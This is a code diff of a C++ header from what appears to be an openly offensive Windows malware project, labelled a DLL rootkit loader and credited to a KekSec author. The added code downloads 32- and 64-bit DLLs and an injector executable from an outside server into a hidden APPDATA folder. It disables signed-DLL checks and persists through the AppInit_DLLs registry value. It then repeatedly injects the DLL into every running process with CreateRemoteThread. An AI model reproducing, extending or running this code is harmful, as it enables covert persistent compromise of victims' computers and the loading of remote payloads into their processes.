@@ -1,5 +1,7 @@
 //dont skid this leave credit - CODED BY FREAK - http://pastebin.com/u/KekSec - https://github.com/freakanonymous
 //please star me on github :D
+//copyright??? - Freak 01/25/2021
+// hope this one works.
 #pragma once
 #ifndef NO_ROOTKIT
 #ifndef __RKIT_LOADED
@@ -10,15 +12,117 @@
 using namespace std;
 #include <comdef.h>
 #include <Wbemidl.h>
-#pragma comment(lib, "wbemuuid.lib")
+#pragma comment(lib, "wbemuuid.lib") //WMI
 #include <atlbase.h>
 #include <atlstr.h>
+#include <windows.h>
+#include <stdio.h>
+#include <psapi.h>
+#include <fstream>
+#include <dbghelp.h>
+#include <fstream>
+#pragma comment(lib, "ntdll.lib") //for RtlAdjustPrivilege in heavens gate test
+#define SE_DEBUG_PRIVILEGE 20
+extern "C" NTSYSAPI NTSTATUS WINAPI RtlAdjustPrivilege(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
+
+
+
+/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+//**//**//**//**//**//**//**//**//*DLL_ROOTKIT_loader LIBRARY START*//**//**//**//**//**//**//**//**//**//**//**//**/
+/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+//**//**//**//**//**//**//**//**//*DLL_ROOTKIT_loader LIBRARY START*//**//**//**//**//**//**//**//**//**//**//**//**/
+/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+//**//**//**//**//**//**//**//**//*DLL_ROOTKIT_loader LIBRARY START*//**//**//**//**//**//**//**//**//**//**//**//**/
+/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+
+
+
+
+
+char x64injectpath[MAX_PATH + 1];
+char* dllhide = "$6829";
+char* mutexseparator = ":";
+bool IsInjected(DWORD pid)
+{
+    CHAR Mutant[64];
+    sprintf(Mutant, "%d%s%s", pid, mutexseparator, dllhide);
+    HANDLE hMu = OpenMutexA(MAXIMUM_ALLOWED, 0, Mutant);
+    if (!hMu)
+        return 0;
+    CloseHandle(hMu);
+
+    return 1;
+}
+BOOL isrunning64 = FALSE;
+
+
+void inject(DWORD dwProcessId, char* dllpath32, char* dllpath64, BOOL isrunning64) {
+    HANDLE h = OpenProcess(PROCESS_ALL_ACCESS, false, dwProcessId);
+    BOOL is64 = FALSE;
+    if (h)
+    {
+        if (isrunning64) {
+            if (IsWow64Process(h, &is64)) {
+                SHELLEXECUTEINFO ShExecInfo;
+                ShExecInfo.cbSize = sizeof(SHELLEXECUTEINFO);
+                ShExecInfo.fMask = SEE_MASK_NOCLOSEPROCESS;
+                ShExecInfo.hwnd = NULL;
+                ShExecInfo.lpVerb = NULL;
+                ShExecInfo.lpFile = x64injectpath;
+                char runinject[MAX_PATH * 2 + 10];
+                sprintf(runinject, "-t 3 %d \"%s\"", dwProcessId, dllpath64);
+                ShExecInfo.lpParameters = runinject;
+                ShExecInfo.lpDirectory = NULL;
+                ShExecInfo.nShow = SW_HIDE;
+                ShExecInfo.hInstApp = NULL;
+                ShellExecuteEx(&ShExecInfo);
+                WaitForSingleObject(ShExecInfo.hProcess, INFINITE);
+                return;
+            }
+        }
+        
+        PVOID LoadLibAddr = (PVOID)GetProcAddress(GetModuleHandleA("Kernel32.dll"), "LoadLibraryA");
+        LPVOID dereercomp = VirtualAllocEx(h, NULL, strlen(dllpath32), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+        WriteProcessMemory(h, dereercomp, dllpath32, strlen(dllpath32), NULL);
+        HANDLE asdc = CreateRemoteThread(h, NULL, NULL, (LPTHREAD_START_ROUTINE)LoadLibAddr, dereercomp, 0, NULL);
+        
+    }
+}
 class WMITask
 {
 protected:
 
-    void WMIConnect(char *dllpath, DWORD mypid);
-    int WMIGetUserProcesses(char *dllpath, DWORD mypid);
+    void WMIConnect(char* dllpath32, char* dllpath64,  BOOL isrunning64, DWORD mypid);
+    int WMIGetUserProcesses(char* dllpath32, char* dllpath64,  BOOL isrunning64, DWORD mypid);
 
     //////////////////////////////////////////////////////
     //////////////////WMI Structs/////////////////////////
@@ -42,31 +146,21 @@ public:
     DWORD mypid;
     ///////////////////////////////////////////////////////
 
-    WMITask(char* dllpath, DWORD mypid);
-    ~WMITask();
+    WMITask(char* dllpath32, char* dllpath64,  BOOL isrunning64, DWORD mypid);
 
-    void WMIConnect(char* dllpath, DWORD mypid);
 
 
 };
 
 // Contructor
 //__________________________________________________________________________________
-WMITask::WMITask(char *dllpath, DWORD mypid)
+WMITask::WMITask(char* dllpath32, char* dllpath64,  BOOL isrunning64, DWORD mypid)
 {
-    WMIConnect(dllpath, mypid);
+    WMIConnect(dllpath32, dllpath64, isrunning64, mypid);
 }
-
-// Destructor
-//__________________________________________________________________________________
-WMITask::~WMITask()
-{
-    // Todo; CoUninitialize(); should go here instead of Connect(); as well as more clean up
-}
-
 // WMI Handler
 //_____________________________________________________________________________
-void WMITask::WMIConnect(char *dllpath, DWORD mypid)
+void WMITask::WMIConnect(char* dllpath32, char* dllpath64,  BOOL isrunning64, DWORD mypid)
 {
     // http://msdn.microsoft.com/en-us/library/aa389273(v=VS.85).aspx
 
@@ -105,7 +199,7 @@ void WMITask::WMIConnect(char *dllpath, DWORD mypid)
 
     if (SUCCEEDED(WMIHandle))
     {
-        WMIGetUserProcesses(dllpath, mypid);
+        WMIGetUserProcesses(dllpath32, dllpath64, isrunning64, mypid);
 
     }
     else {
@@ -115,8 +209,8 @@ void WMITask::WMIConnect(char *dllpath, DWORD mypid)
 }
 
 
+int WMITask::WMIGetUserProcesses(char* dllpath32, char* dllpath64,  BOOL isrunning64, DWORD mypid)
 
-int WMITask::WMIGetUserProcesses(char * dllpath, DWORD mypid)
 {
     /////////////////////////////////////////////////////////////////////////////////////////
     // Var's & Class Declerations
@@ -145,7 +239,7 @@ int WMITask::WMIGetUserProcesses(char * dllpath, DWORD mypid)
 
     // Execute Service Query
     // --------------------------------------------------
-    WMIHandle = service->ExecQuery(L"WQL", L"SELECT * FROM Win32_Process",
+    WMIHandle = service->ExecQuery(L"WQL", L"SELECT ProcessId FROM Win32_Process",
         WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY, NULL, &enumerator);
     // --------------------------------------------------
     if (SUCCEEDED(WMIHandle))		// - Check Query Result
@@ -158,26 +252,14 @@ int WMITask::WMIGetUserProcesses(char * dllpath, DWORD mypid)
             if (SUCCEEDED(WMIHandle))	// - Check Query Result
             {
                 if (retcnt > 0)			// - Check if anymore object vars are avalible
+
                 {
-                        WMIHandle = object->Get(L"ProcessId", 0, &var_val, NULL, NULL);
-                        int theproc = var_val.intVal;
+                    WMIHandle = object->Get(L"ProcessId", 0, &var_val, NULL, NULL);
+                    int dwProcessId = var_val.intVal;
+                    if (!IsInjected(dwProcessId) && dwProcessId != mypid && dwProcessId != 0) {
+                        inject(dwProcessId, dllpath32, dllpath64, isrunning64);
+                    }
 
-                        if (!IsInjected(theproc) && theproc != mypid) {
-                            HANDLE h = OpenProcess(PROCESS_ALL_ACCESS, false, theproc);
-                            if (h)
-                            {
-                                LPVOID LoadLibAddr = (LPVOID)GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
-                                LPVOID dereercomp = VirtualAllocEx(h, NULL, strlen(dllpath), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-                                WriteProcessMemory(h, dereercomp, dllpath, strlen(dllpath), NULL);
-                                HANDLE asdc = CreateRemoteThread(h, NULL, NULL, (LPTHREAD_START_ROUTINE)LoadLibAddr, dereercomp, 0, NULL);
-                                WaitForSingleObject(asdc, INFINITE);
-                                VirtualFreeEx(h, dereercomp, strlen(dllpath), MEM_RELEASE);
-                                CloseHandle(asdc);
-                                CloseHandle(h);
-                            };
-                        }
-
-                    
                 }
                 else {
                     statusreturn = -3; break; // Enumeration empty(emptied)
@@ -191,6 +273,10 @@ int WMITask::WMIGetUserProcesses(char * dllpath, DWORD mypid)
     else {
         statusreturn = -1; // Bad ExecQuery
     }
+
+    // Release Memory
+    // --------------------------------------------------
+
 
     // Release Memory
     // --------------------------------------------------
@@ -208,25 +294,12 @@ int WMITask::WMIGetUserProcesses(char * dllpath, DWORD mypid)
 
     return statusreturn;
 }
-char* dllhide = "noneyabusiness";
-char *mutexseparator = "/";
-bool IsInjected(DWORD pid)
-{
-	CHAR Mutant[64];
-	sprintf(Mutant, "%d%s%s", pid, mutexseparator, dllhide);
-	HANDLE hMu = OpenMutexA(MAXIMUM_ALLOWED, 0, Mutant);
-	if (!hMu)
-		return 0;
-	CloseHandle(hMu);
-
-	return 1;
-}
 #pragma comment(lib, "urlmon.lib")
 
 void DownloadFile(char* url, char* dest) {
 
 	HINTERNET hInet;
-	hInet = InternetOpenA("Dll Getter", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
+	hInet = InternetOpenA("wininet", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
 	if (!hInet) return;
 	HANDLE fh, f;
 	
@@ -248,7 +321,27 @@ void DownloadFile(char* url, char* dest) {
 		} while (r > 0);
 		CloseHandle(f);
 	}
-}
+}/*
+char *getFileContent(char * pathname) {
+	ifstream hexa;
+	hexa.open(pathname);
+	int size = hexa.tellg();
+	char* hexarray =(char*)malloc(size);
+
+	while (!hexa.eof())
+	{
+		for (int i = 0; i <= size; i++)
+		{
+
+			hexarray[i] = hexa.get();
+		}
+	}
+
+
+
+	hexa.close();
+	return hexarray;
+}*/
 DWORD WINAPI rootkit(LPARAM none) {
 
 
@@ -271,46 +364,99 @@ DWORD WINAPI rootkit(LPARAM none) {
 		KEY_WRITE,
 		&hKey
 	);
-	char dllinstallpath[MAX_PATH + 17];
-	sprintf(dllinstallpath, "%s\\%s\\%s_.dll", std::getenv("APPDATA"), dllhide, dllhide);
+    char dllinstallpath32[MAX_PATH + 1];
+    char dllinstallpath64[MAX_PATH + 1];
+    char exeinstallpath[MAX_PATH + 1];
+    sprintf_s(dllinstallpath32, "%s\\%s\\%s_32.dll", std::getenv("APPDATA"), dllhide, dllhide);
+	sprintf_s(dllinstallpath64, "%s\\%s\\%s_64.dll", std::getenv("APPDATA"), dllhide, dllhide);
+    sprintf_s(exeinstallpath, "%s\\%s\\%s_.exe", std::getenv("APPDATA"), dllhide, dllhide);
 	struct stat buffer;
-	char url[512];
-	if (stat(dllinstallpath, &buffer) != 0) {
-		SYSTEM_INFO sysInfo, * lpInfo;
-		lpInfo = &sysInfo;
-		::GetSystemInfo(lpInfo);
-		switch (lpInfo->wProcessorArchitecture) {
-		case PROCESSOR_ARCHITECTURE_AMD64:
-		case PROCESSOR_ARCHITECTURE_IA64:
-			sprintf(url, "http://%s/x64.dll", dllserver);
-			break;
-		case PROCESSOR_ARCHITECTURE_INTEL:
-			sprintf(url, "http://%s/x86.dll", dllserver);
-			break;
-		case PROCESSOR_ARCHITECTURE_UNKNOWN:
-		default:
-			return 1;
+	char url32[512] = { 0 };
+    sprintf_s(url32, "http://%s/x86.dll", dllserver);
+    if (stat(dllinstallpath32, &buffer) != 0) {
+        DownloadFile(url32, dllinstallpath32);
+        if (stat(dllinstallpath32, &buffer) != 0) return 2;
+    }
+    BOOL f64 = FALSE;
+    isrunning64 = IsWow64Process(GetCurrentProcess(), &f64) && f64;
+	char url64[512] = { 0 };
+	char x64injectpathurl[512] = { 0 };
+    if (isrunning64) {
+        sprintf_s(dllinstallpath64, "%s\\%s\\%s_64.dll", std::getenv("APPDATA"), dllhide, dllhide);
+        sprintf_s(x64injectpath, "%s\\%s\\%s_64i.exe", std::getenv("APPDATA"), dllhide, dllhide);
+        sprintf_s(url64, "http://%s/x64.dll", dllserver);
+        sprintf_s(x64injectpathurl, "http://%s/x64i.exe", dllserver);
+		if (stat(dllinstallpath64, &buffer) != 0) {
+			DownloadFile(url64, dllinstallpath64);
+			if (stat(dllinstallpath64, &buffer) != 0) return 2;
 		}
-	}
-	DownloadFile(url, dllinstallpath);
-	if (!FileExists(dllinstallpath)) return 2;
+		if (stat(x64injectpath, &buffer) != 0) {
+			sprintf_s(x64injectpathurl, "http://%s/x64i.exe", dllserver);
+			DownloadFile(x64injectpathurl, x64injectpath);
+			if (stat(x64injectpath, &buffer) != 0) return 3;
+		}
+    }
 
-	if (result == ERROR_SUCCESS) {
+    if (result == ERROR_SUCCESS) {
+            DWORD value0 = 0;
+            DWORD value1 = 1;
 
-		DWORD value0 = 0;
-		DWORD value1 = 1;
-		RegSetValueExA(hKey, "AppInit_DLLs", 0, REG_SZ, (BYTE*)dllinstallpath, (strlen(dllinstallpath) + 1) * sizeof(char));
-		RegSetValueExA(hKey, "RequireSignedAppInit_DLLs", 0, REG_DWORD, (BYTE*)value0, sizeof(DWORD));
-		RegSetValueExA(hKey, "LoadAppInit_DLLs", 0, REG_DWORD, (BYTE*)value1, sizeof(DWORD));
-		RegCloseKey(hKey);
-	}
-	DWORD aProcesses[1024], cbNeeded, cProcesses;
-	unsigned int i;
-    DWORD mypid = GetCurrentProcessId();
+            if (!isrunning64) {
+                RegSetValueExA(hKey, "AppInit_DLLs", 0, REG_SZ, (BYTE*)dllinstallpath32, (strlen(dllinstallpath32) + 1) * sizeof(char));
+            }
+            else {
+                RegSetValueExA(hKey, "AppInit_DLLs", 0, REG_SZ, (BYTE*)dllinstallpath64, (strlen(dllinstallpath64) + 1) * sizeof(char));
+            }
+            RegSetValueExA(hKey, "RequireSignedAppInit_DLLs", 0, REG_DWORD, (BYTE*)value0, sizeof(DWORD));
+            RegSetValueExA(hKey, "LoadAppInit_DLLs", 0, REG_DWORD, (BYTE*)value1, sizeof(DWORD));
+            RegCloseKey(hKey);
+    }
+    
+	// check if the library has a ReflectiveLoader...
+	//char *lpBuff = getFileContent(dllinstallpath
+    DWORD mypid = GetCurrentProcessId(); //mypid is used for making sure we dont hook our own process
 	while (1) {
-        WMITask wmi = WMITask(dllinstallpath, mypid);
-        Sleep(100);
+        //DWORD activePID;
+        //HWND activeWnd = GetActiveWindow();
+       // GetWindowThreadProcessId(activeWnd, &activePID);
+       // if(activePID != mypid) inject(activePID, dllinstallpath32, dllinstallpath64, isrunning64);
+        WMITask(dllinstallpath32, dllinstallpath64, isrunning64, mypid);
+        Sleep(150);
 	}
 }
 #endif
 #endif
+
+/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+//**//**//**//**//**//**//**//**//*DLL_ROOTKIT_loader LIBRARY END*//**//**//**//**//**//**//**//**//**//**//**//**///
+/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+//**//**//**//**//**//**//**//**//*DLL_ROOTKIT_loader LIBRARY END*//**//**//**//**//**//**//**//**//**//**//**//**///
+/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+//**//**//**//**//**//**//**//**//*DLL_ROOTKIT_loader LIBRARY END*//**//**//**//**//**//**//**//**//**//**//**//**///
+/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
